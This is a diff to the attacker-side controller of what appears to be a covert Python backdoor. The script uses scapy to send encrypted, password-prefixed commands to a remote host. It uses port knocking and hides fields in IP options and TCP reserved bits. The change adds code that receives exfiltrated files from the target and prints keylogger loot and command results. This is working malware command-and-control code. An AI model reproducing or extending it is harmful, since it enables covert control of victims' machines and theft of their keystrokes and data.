@@ -17,7 +17,7 @@ password stored in ip_option field
 type of response stored in tcp reserved field
 result stored in tcp payload
 """
-
+BUFFER_SIZE = 1024
 class Attacker(object):
 
     def __init__(self, lhost, lport, fport, rhost, rport, proto, password, kList, ttl):
@@ -30,10 +30,7 @@ class Attacker(object):
 
         self.password = password
 
-        self.knockList = []
-        for port in kList.split(','):
-            self.knockList.append(int(port))
-
+        self.knockList = kList.split(',')
         self.ttl = int(ttl)
         self.state = 0
 
@@ -43,10 +40,6 @@ class Attacker(object):
         send_command_thread = threading.Thread(target=self.sendCommand)
         send_command_thread.setDaemon(True)
         send_command_thread.start()
-
-        listen_thread = threading.Thread(target=self.listen)
-        listen_thread.setDaemon(True)
-        listen_thread.start()
 
         knock_listener_thread = threading.Thread(target=self.knockListener)
         knock_listener_thread.setDaemon(True)
@@ -64,11 +57,7 @@ class Attacker(object):
             cmd = raw_input()
             sys.stdout.flush()
             payload = encryption.encrypt(self.password + cmd)
-            if self.protocol == 'TCP':
-                packet = IP(dst=self.remoteIP, src=self.localIP)/TCP(dport=self.remotePort, sport=self.localPort)/Raw(load=payload)
-            elif self.protocol == 'UDP':
-                packet = IP(dst=self.remoteIP, src=self.localIP)/UDP(dport=self.remotePort, sport=self.localPort)/Raw(load=payload)
-
+            packet = IP(dst=self.remoteIP, src=self.localIP)/TCP(dport=self.remotePort, sport=self.localPort)/Raw(load=payload)
             send(packet, verbose=False)
 
             if cmd == 'CLOSE':
@@ -123,32 +112,16 @@ class Attacker(object):
                 receivedData.write(data)
 
         conn.close()
-        encryption.decryptFile(dummyFile)
+        sucess, filename = encryption.decryptFile(dummyFile)
+        if sucess:
+            if filename == ".loot.txt":
+                with open(filename, "rb") as myfile:
+                    print("Keylogg: {}".format(myfile.read(BUFFER_SIZE)))
+            elif filename == "result.txt":
+                with open(filename, "rb") as myfile:
+                    print("Result: {}".format(myfile.read(BUFFER_SIZE)))
         os.remove(dummyFile)
         print("Done receiving!")
-
-
-    def listen(self):
-        mFilter = self.protocol.lower() + " src port " + str(self.remotePort) + " and dst port " + \
-                str(self.localPort) + " and src host " + self.remoteIP
-        print("Filter: %s" % mFilter)
-        sniff(lfilter=self.isIncoming, filter=mFilter, prn=self.parsePacket)
-
-    def parsePacket(self, packet):
-        """
-        """
-        payload = packet[self.protocol].payload.load
-        data = encryption.decrypt(payload)
-
-        if data == "":
-            return
-        password = data[:8]
-        result = data[8:]
-
-        if password not in self.password:
-            return
-        else:
-            print("Result:\n%s" % result)
 
     def isIncoming(self, packet):
         """
